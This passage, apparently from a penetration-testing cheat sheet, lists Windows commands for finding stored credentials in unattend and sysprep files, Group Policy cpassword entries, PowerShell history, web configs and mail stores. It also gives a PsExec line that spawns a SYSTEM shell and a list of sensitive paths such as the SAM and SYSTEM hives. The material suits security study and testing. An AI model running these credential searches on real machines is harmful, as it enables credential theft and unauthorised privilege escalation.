</span><span class="c"># Are there sysprep or unattend files available that weren’t cleaned up?</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="o">*</span><span class="nx">sysprep.inf</span><span class="w"> </span><span class="o">*</span><span class="nx">sysprep.xml</span><span class="w"> </span><span class="o">*</span><span class="nx">unattended.xml</span><span class="w"> </span><span class="o">*</span><span class="nx">unattend.xml</span><span class="w"> </span><span class="o">*</span><span class="nx">unattend.txt</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w">
</span><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*</span><span class="nx">unattend</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="nx">sysprep</span><span class="o">*</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*.xml"</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*.txt"</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*.ini"</span><span class="p">)}</span><span class="w">
</span><span class="n">C:\unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\Panther\Unattend.xml</span><span class="w">
</span><span class="n">C:\Windows\Panther\Unattend\Unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\system32\sysprep.inf</span><span class="w">
</span><span class="n">C:\Windows\system32\sysprep\sysprep.xml</span><span class="w">

</span><span class="c"># Are there any Group Policy Preferences files whoese passwords can be easily cracked?</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/I</span><span class="w"> </span><span class="nx">cpassword</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">FQDN</span><span class="err">&gt;</span><span class="nx">\sysvol\</span><span class="err">&lt;</span><span class="nx">FQDN</span><span class="err">&gt;</span><span class="nx">\policies\</span><span class="o">*.</span><span class="nf">xml</span><span class="w">
</span></code></pre></div></div> <h2 id="interesting-files-and-sensitive-information"> <a href="#interesting-files-and-sensitive-information" class="anchor-heading" aria-labelledby="interesting-files-and-sensitive-information"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Interesting Files and Sensitive Information </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Powershell history</span><span class="w">
</span><span class="n">Get-PSReadlineOption</span><span class="w">
</span><span class="nx">type</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="nx">\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><span class="w">


</span><span class="c"># If the server is an IIS webserver, what’s in inetpub? Any hidden directories? web.config files?</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/a</span><span class="w"> </span><span class="nx">C:\inetpub\</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">web.config</span><span class="w">
</span><span class="n">C:\Windows\System32\inetsrv\config\applicationHost.config</span><span class="w">

</span><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\inetpub\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">web.config</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">

</span><span class="c"># What’s in the IIS Logs?</span><span class="w">
</span><span class="n">C:\inetpub\logs\LogFiles\W3SVC1\u_ex</span><span class="p">[</span><span class="n">YYMMDD</span><span class="p">]</span><span class="o">.</span><span class="nf">log</span><span class="w">
</span><span class="nx">C:\inetpub\logs\LogFiles\W3SVC2\u_ex</span><span class="p">[</span><span class="n">YYMMDD</span><span class="p">]</span><span class="o">.</span><span class="nf">log</span><span class="w">
</span><span class="nx">C:\inetpub\logs\LogFiles\FTPSVC1\u_ex</span><span class="p">[</span><span class="n">YYMMDD</span><span class="p">]</span><span class="o">.</span><span class="nf">log</span><span class="w">
</span><span class="nx">C:\inetpub\logs\LogFiles\FTPSVC2\u_ex</span><span class="p">[</span><span class="n">YYMMDD</span><span class="p">]</span><span class="o">.</span><span class="nf">log</span><span class="w">

</span><span class="c"># Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">php.ini</span><span class="w"> </span><span class="nx">httpd.conf</span><span class="w"> </span><span class="nx">httpd-xampp.conf</span><span class="w"> </span><span class="nx">my.ini</span><span class="w"> </span><span class="nx">my.cnf</span><span class="w">
</span><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">php.ini</span><span class="p">,</span><span class="nx">httpd.conf</span><span class="p">,</span><span class="nx">httpd-xampp.conf</span><span class="p">,</span><span class="nx">my.ini</span><span class="p">,</span><span class="nx">my.cnf</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">

</span><span class="c"># Any Apache web logs?</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">access.log</span><span class="w"> </span><span class="nx">error.log</span><span class="w">
</span><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">access.log</span><span class="p">,</span><span class="nx">error.log</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">

</span><span class="c"># Any interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="o">*</span><span class="nx">pass</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="err">&gt;</span><span class="n">nul</span><span class="w">
</span><span class="nx">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*</span><span class="nx">password</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="nx">vnc</span><span class="o">*</span><span class="p">,</span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span><span class="n">Get-Childitem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="nx">password</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="nx">vnc</span><span class="o">*</span><span class="p">,</span><span class="o">*.</span><span class="nf">config</span><span class="p">,</span><span class="o">*.</span><span class="nf">txt</span><span class="o">*</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w">

</span><span class="c"># Emails</span><span class="w">
</span><span class="n">C:\users\</span><span class="p">(</span><span class="n">your</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">name</span><span class="p">)</span><span class="n">\AppData\Local\Microsoft\Windows</span><span class="w"> </span><span class="nx">Mail\Local</span><span class="w"> </span><span class="nx">Folders</span><span class="w">
</span><span class="n">C:\Users\AppData\Local\Packages\LocalState\Indexed\LiveComm</span><span class="w">

</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">dbx</span><span class="w">
</span><span class="nx">dir</span><span class="w"> </span><span class="o">*.</span><span class="nf">dbx</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span><span class="n">Get-Childitem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*.</span><span class="nf">dbx</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w">
</span><span class="n">Get-Childitem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">dbx</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></code></pre></div></div> <h2 id="from-local-administrator-to-nt-system"> <a href="#from-local-administrator-to-nt-system" class="anchor-heading" aria-labelledby="from-local-administrator-to-nt-system"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> From local administrator to NT SYSTEM </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PsExec.exe</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
</span></code></pre></div></div> <h2 id="logs"> <a href="#logs" class="anchor-heading" aria-labelledby="logs"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Logs </h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Apache\conf\httpd.conf</span><span class="w">
</span><span class="nx">C:\Apache\logs\access.log</span><span class="w">
</span><span class="n">C:\Apache\logs\error.log</span><span class="w">
</span><span class="nx">C:\Apache2\conf\httpd.conf</span><span class="w">
</span><span class="n">C:\Apache2\logs\access.log</span><span class="w">
</span><span class="nx">C:\Apache2\logs\error.log</span><span class="w">
</span><span class="n">C:\Apache22\conf\httpd.conf</span><span class="w">
</span><span class="nx">C:\Apache22\logs\access.log</span><span class="w">
</span><span class="n">C:\Apache22\logs\error.log</span><span class="w">
</span><span class="nx">C:\Apache24\conf\httpd.conf</span><span class="w">
</span><span class="n">C:\Apache24\logs\access.log</span><span class="w">
</span><span class="nx">C:\Apache24\logs\error.log</span><span class="w">
</span><span class="n">C:\Documents</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">Settings\Administrator\NTUser.dat</span><span class="w">
</span><span class="n">C:\php\php.ini</span><span class="w">
</span><span class="nx">C:\php4\php.ini</span><span class="w">
</span><span class="n">C:\php5\php.ini</span><span class="w">
</span><span class="nx">C:\php7\php.ini</span><span class="w">
</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\Apache</span><span class="w"> </span><span class="nx">Group\Apache\conf\httpd.conf</span><span class="w">
</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\Apache</span><span class="w"> </span><span class="nx">Group\Apache\logs\access.log</span><span class="w">
</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\Apache</span><span class="w"> </span><span class="nx">Group\Apache\logs\error.log</span><span class="w">
</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\Apache</span><span class="w"> </span><span class="nx">Group\Apache2\conf\httpd.conf</span><span class="w">
</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\Apache</span><span class="w"> </span><span class="nx">Group\Apache2\logs\access.log</span><span class="w">
</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\Apache</span><span class="w"> </span><span class="nx">Group\Apache2\logs\error.log</span><span class="w">
</span><span class="n">c:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\php\php.ini</span><span class="s2">"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
</span></code></pre></div></div> <style> .share { display: block; margin-left: auto; margin-right: auto; text-align: center; } </style> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs> <symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z" /></symbol> <symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z" /></symbol> <symbol id="icon-email" viewBox="0 0 1024 1024"><path class="path1" d="M950.857 859.429v-438.857q-18.286 20.571-39.429 37.714-153.143 117.714-243.429 193.143-29.143 24.571-47.429 38.286t-49.429 27.714-58.571 14h-1.143q-27.429 0-58.571-14t-49.429-27.714-47.429-38.286q-90.286-75.429-243.429-193.143-21.143-17.143-39.429-37.714v438.857q0 7.429 5.429 12.857t12.857 5.429h841.143q7.429 0 12.857-5.429t5.429-12.857zM950.857 258.857v-14t-0.286-7.429-1.714-7.143-3.143-5.143-5.143-4.286-8-1.429h-841.143q-7.429 0-12.857 5.429t-5.429 12.857q0 96 84 162.286 110.286 86.857 229.143 181.143 3.429 2.857 20 16.857t26.286 21.429 25.429 18 28.857 15.714 24.571 5.143h1.143q11.429 0 24.571-5.143t28.857-15.714 25.429-18 26.286-21.429 20-16.857q118.857-94.286 229.143-181.143 30.857-24.571 57.429-66t26.571-75.143zM1024 237.714v621.714q0 37.714-26.857 64.571t-64.571 26.857h-841.143q-37.714 0-64.571-26.857t-26.857-64.571v-621.714q0-37.714 26.857-64.571t64.571-26.857h841.143q37.714 0 64.571 26.857t26.857 64.571z" /></symbol> <symbol id="icon-close" viewBox="0 0 805 1024"><path class="path1" d="M741.714 755.429q0 22.857-16 38.857l-77.714 77.714q-16 16-38.857 16t-38.857-16l-168-168-168 168q-16 16-38.857 16t-38.857-16l-77.714-77.714q-16-16-16-38.857t16-38.857l168-168-168-168q-16-16-16-38.857t16-38.857l77.714-77.714q16-16 38.857-16t38.857 16l168 168 168-168q16-16 38.857-16t38.857 16l77.714 77.714q16 16 16 38.857t-16 38.857l-168 168 168 168q16 16 16 38.857z" /></symbol> <symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z" /></symbol> <symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z" /></symbol> <symbol id="icon-rss" viewBox="0 0 805 1024"><path class="path1" d="M219.429 768q0 45.714-32 77.714t-77.714 32-77.714-32-32-77.714 32-77.714 77.714-32 77.714 32 32 77.714zM512 838.286q1.143 16-9.714 27.429-10.286 12-26.857 12h-77.143q-14.286 0-24.571-9.429t-11.429-23.714q-12.571-130.857-105.429-223.714t-223.714-105.429q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.571 12-26.857 9.714-9.714 24.571-9.714h2.857q91.429 7.429 174.857 46t148 103.714q65.143 64.571 103.714 148t46 174.857zM804.571 839.429q1.143 15.429-10.286 26.857-10.286 11.429-26.286 11.429h-81.714q-14.857 0-25.429-10t-11.143-24.286q-6.857-122.857-57.714-233.429t-132.286-192-192-132.286-233.429-58.286q-14.286-0.571-24.286-11.143t-10-24.857v-81.714q0-16 11.429-26.286 10.286-10.286 25.143-10.286h1.714q149.714 7.429 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.571 286.571z" /></symbol> <symbol id="icon-google-plus" viewBox="0 0 951 1024"><path class="path1" d="M420 454.857q0 20.571 18.286 40.286t44.286 38.857 51.714 42 44 59.429 18.286 81.143q0 51.429-27.429 98.857-41.143 69.714-120.571 102.571t-170.286 32.857q-75.429 0-140.857-23.714t-98-78.571q-21.143-34.286-21.143-74.857 0-46.286 25.429-85.714t67.714-65.714q74.857-46.857 230.857-57.143-18.286-24-27.143-42.286t-8.857-41.714q0-20.571 12-48.571-26.286 2.286-38.857 2.286-84.571 0-142.571-55.143t-58-139.714q0-46.857 20.571-90.857t56.571-74.857q44-37.714 104.286-56t124.286-18.286h238.857l-78.857 50.286h-74.857q42.286 36 64 76t21.714 91.429q0 41.143-14 74t-33.714 53.143-39.714 37.143-34 35.143-14 37.714zM336.571 400q21.714 0 44.571-9.429t37.714-24.857q30.286-32.571 30.286-90.857 0-33.143-9.714-71.429t-27.714-74-48.286-59.143-66.857-23.429q-24 0-47.143 11.143t-37.429 30q-26.857 33.714-26.857 91.429 0 26.286 5.714 55.714t18 58.857 29.714 52.857 42.857 38.286 55.143 14.857zM337.714 898.857q33.143 0 63.714-7.429t56.571-22.286 41.714-41.714 15.714-62.286q0-14.286-4-28t-8.286-24-15.429-23.714-16.857-20-22-19.714-20.857-16.571-23.714-17.143-20.857-14.857q-9.143-1.143-27.429-1.143-30.286 0-60 4t-61.429 14.286-55.429 26.286-39.143 42.571-15.429 60.286q0 40 20 70.571t52.286 47.429 68 25.143 72.857 8.286zM800.571 398.286h121.714v61.714h-121.714v125.143h-60v-125.143h-121.143v-61.714h121.143v-124h60v124z" /></symbol> <symbol id="icon-github-alt" viewBox="0 0 951 1024"><path class="path1" d="M365.714 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM731.429 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM822.857 694.857q0-68.571-39.429-116.571t-106.857-48q-23.429 0-111.429 12-40.571 6.286-89.714 6.286t-89.714-6.286q-86.857-12-111.429-12-67.429 0-106.857 48t-39.429 116.571q0 50.286 18.286 87.714t46.286 58.857 69.714 34.286 80 16.857 85.143 4h96q46.857 0 85.143-4t80-16.857 69.714-34.286 46.286-58.857 18.286-87.714zM950.857 594.286q0 118.286-34.857 189.143-21.714 44-60.286 76t-80.571 49.143-97.143 27.143-98 12.571-95.429 2.571q-44.571 0-81.143-1.714t-84.286-7.143-87.143-17.143-78.286-29.429-69.143-46.286-49.143-65.714q-35.429-70.286-35.429-189.143 0-135.429 77.714-226.286-15.429-46.857-15.429-97.143 0-66.286 29.143-124.571 61.714 0 108.571 22.571t108 70.571q84-20 176.571-20 84.571 0 160 18.286 60-46.857 106.857-69.143t108-22.286q29.143 58.286 29.143 124.571 0 49.714-15.429 96 77.714 91.429 77.714 227.429z" /></symbol> <symbol id="icon-right-arrow"><path d="M21.205,5.007c-0.429-0.444-1.143-0.444-1.587,0c-0.429,0.429-0.429,1.143,0,1.571l8.047,8.047H1.111 C0.492,14.626,0,15.118,0,15.737c0,0.619,0.492,1.127,1.111,1.127h26.554l-8.047,8.032c-0.429,0.444-0.429,1.159,0,1.587 c0.444,0.444,1.159,0.444,1.587,0l9.952-9.952c0.444-0.429,0.444-1.143,0-1.571L21.205,5.007z" fill="#efb102" /></symbol> <symbol id="icon-linkedin" viewBox="0 0 12 14"><path class="path1" d="M1.852 11.047h1.805v-5.422h-1.805v5.422zM3.773 3.953q-0.008-0.406-0.281-0.672t-0.727-0.266-0.738 0.266-0.285 0.672q0 0.398 0.277 0.668t0.723 0.27h0.008q0.461 0 0.742-0.27t0.281-0.668zM8.344 11.047h1.805v-3.109q0-1.203-0.57-1.82t-1.508-0.617q-1.062 0-1.633 0.914h0.016v-0.789h-1.805q0.023 0.516 0 5.422h1.805v-3.031q0-0.297 0.055-0.438 0.117-0.273 0.352-0.465t0.578-0.191q0.906 0 0.906 1.227v2.898zM12 3.25v7.5q0 0.93-0.66 1.59t-1.59 0.66h-7.5q-0.93 0-1.59-0.66t-0.66-1.59v-7.5q0-0.93 0.66-1.59t1.59-0.66h7.5q0.93 0 1.59 0.66t0.66 1.59z"></path></symbol> <symbol id="icon-instagram" viewBox="0 0 438.536 438.536"><path class="path1" d="M421.981,16.562C410.941,5.519,397.711,0,382.298,0H56.248C40.83,0,27.604,5.521,16.561,16.562 C5.52,27.6,0.001,40.828,0.001,56.243V382.29c0,15.413,5.518,28.644,16.56,39.683c11.043,11.04,24.272,16.563,39.687,16.563 h326.046c15.41,0,28.644-5.523,39.684-16.563c11.043-11.039,16.557-24.27,16.557-39.683V56.243 C438.534,40.825,433.021,27.604,421.981,16.562z M157.462,158.025c17.224-16.652,37.924-24.982,62.097-24.982 c24.36,0,45.153,8.33,62.381,24.982c17.228,16.655,25.837,36.785,25.837,60.386c0,23.598-8.609,43.729-25.837,60.379 c-17.228,16.659-38.014,24.988-62.381,24.988c-24.172,0-44.87-8.336-62.097-24.988c-17.228-16.652-25.841-36.781-25.841-60.379 C131.621,194.81,140.234,174.681,157.462,158.025z M388.865,370.589c0,4.945-1.718,9.083-5.141,12.416 c-3.433,3.33-7.519,4.996-12.282,4.996h-305.2c-4.948,0-9.091-1.666-12.419-4.996c-3.333-3.326-4.998-7.471-4.998-12.416V185.575 H89.08c-3.805,11.993-5.708,24.462-5.708,37.402c0,36.553,13.322,67.715,39.969,93.511c26.65,25.786,58.721,38.685,96.217,38.685 c24.744,0,47.583-5.903,68.527-17.703c20.937-11.807,37.486-27.839,49.676-48.112c12.183-20.272,18.274-42.4,18.274-66.38 c0-12.94-1.91-25.406-5.715-37.402h38.547v185.014H388.865z M388.865,115.626c0,5.52-1.903,10.184-5.716,13.99 c-3.805,3.809-8.466,5.711-13.989,5.711h-49.676c-5.517,0-10.185-1.903-13.99-5.711c-3.806-3.806-5.708-8.47-5.708-13.99V68.522 c0-5.33,1.902-9.945,5.708-13.848c3.806-3.901,8.474-5.854,13.99-5.854h49.676c5.523,0,10.185,1.952,13.989,5.854 c3.812,3.903,5.716,8.518,5.716,13.848V115.626z" /></symbol> <symbol id="icon-telegram" viewBox="0 0 80 80"> <path d="M 70.511719 10.986328 C 69.833089 11.015588 69.157051 11.196735 68.537109 11.4375 L 68.535156 11.4375 C 67.931048 11.673297 64.049934 13.281226 58.392578 15.628906 C 52.735222 17.976586 45.3821 21.032905 38.091797 24.064453 C 23.51119 30.12755 9.1835937 36.091797 9.1835938 36.091797 L 9.2480469 36.068359 C 9.2480469 36.068359 8.4485192 36.330303 7.6484375 36.871094 C 7.2483967 37.141489 6.8283994 37.486951 6.4960938 37.966797 C 6.163788 38.446643 5.9299055 39.103809 6.0195312 39.808594 C 6.1812736 41.080477 7.0482024 41.912426 7.7636719 42.412109 C 8.4791414 42.911793 9.1660156 43.148437 9.1660156 43.148438 L 9.1738281 43.152344 L 23.1875 47.785156 C 23.418097 48.587707 27.163839 61.631062 28.046875 64.384766 C 28.50876 65.826709 28.935922 66.627156 29.335938 67.130859 C 29.535944 67.382711 29.733459 67.561543 29.931641 67.683594 C 30.016841 67.736064 30.101273 67.771554 30.183594 67.802734 C 30.197014 67.807834 30.211349 67.817736 30.224609 67.822266 C 30.252855 67.83191 30.267938 67.831811 30.302734 67.839844 C 31.62302 68.328201 32.738281 67.476563 32.738281 67.476562 L 32.769531 67.453125 L 42.376953 59 L 56.585938 70.394531 L 56.710938 70.449219 C 58.991132 71.431474 60.875783 70.891854 61.970703 70.027344 C 63.065623 69.162833 63.509766 68.03125 63.509766 68.03125 L 63.544922 67.943359 L 73.794922 16.097656 C 74.046117 14.98858 74.071392 14.057617 73.853516 13.257812 C 73.635643 12.458006 73.128863 11.807693 72.5 11.443359 C 71.871137 11.079025 71.190348 10.957066 70.511719 10.986328 z M 70.566406 13.021484 C 70.96444 13.004357 71.29991 13.059037 71.498047 13.173828 C 71.696183 13.288619 71.824951 13.420226 71.923828 13.783203 C 72.022708 14.14618 72.046557 14.758873 71.84375 15.654297 L 71.839844 15.667969 L 61.630859 67.3125 C 61.615849 67.34707 61.352842 67.965627 60.730469 68.457031 C 60.102941 68.952505 59.248838 69.318622 57.578125 68.626953 L 34.738281 50.310547 A 1.0001 1.0001 0 0 0 34 50 A 1.0001 1.0001 0 0 0 32.988281 50.974609 L 30.384766 64.923828 C 30.251656 64.61729 30.108215 64.257609 29.953125 63.773438 C 